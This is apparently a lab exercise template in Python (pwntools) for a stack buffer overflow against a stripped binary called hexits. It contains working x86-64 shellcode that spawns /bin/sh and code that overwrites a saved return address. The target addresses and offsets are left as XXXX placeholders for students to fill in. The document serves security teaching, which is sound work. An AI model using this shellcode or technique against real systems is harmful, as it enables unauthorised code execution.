#!/usr/bin/env python3 

from pwn import *

# Exercise 4. This task is similar to Exercise 1, except that we will use hexits (the stripped version of hexit). 
# You will just need to figure out how to extract relevant addresses from the binary, the rest is the same as Exercise 1. 
# Use this attack script to help you create the payload file for the attack inside gdb. 


def shellcode():
  # x86-64 architecture
  context.arch = 'amd64'
  code = asm('''
    xor rax,rax         ; 
    push rax            ; 
    mov rbx,0x68732f2f6e69622f  ; 
    push rbx
    mov rdi,rsp         ; 
    push rax            ; 
    push rdi            ; 
    mov rsi,rsp         ; 
    xor rdx, rdx        ; 
    mov al, 59          ; 
    syscall             
  ''')
  return code 



def main():

  # payload length
  bytearraylen = 512

  # This is where the actual payload will be stored
  # Initiallly, fill it with some arbitray bytes, e.g., byte 0x41. 
  content = bytearray(0x41 for i in range(bytearraylen))

  # generate shellcode 
  code = shellcode()
  
  # we'll put the shellcode at the end of the payload
  # so the shellcode's offset, relative to the start of the buffer, 
  # is bytearraylen - length_of_shellcode. 
  shellcode_offset = bytearraylen - len(code)
  content[shellcode_offset:] = code 

  # TODO: find the address of the buffer

  buffer_address = XXXX

  # TODO: calculate the address of the shellcode
  shellcode_address = XXXX

  # TODO: calculate offset of the stored return address
  # relative to the start of buffer. 
  # You can analyse the disassembly to determine this offset,
  # but this might be slightly trickier compared to Exercise 1.
  # An easier way would be to do this in gdb, using a de Bruijn
  # sequence as the payload. See the lab manual for details. 
  rt_offset = XXXX

  # overwrite the stored return address with the shellcode address
  content[rt_offset:rt_offset+0x8] = p64(shellcode_address)
  
  # write payload to 'badfile4'
  print('Writing payload to badfile4..')
  with open('badfile4', 'wb') as f:
    f.write(content)
  print('Done')

if __name__ == '__main__':
    main()
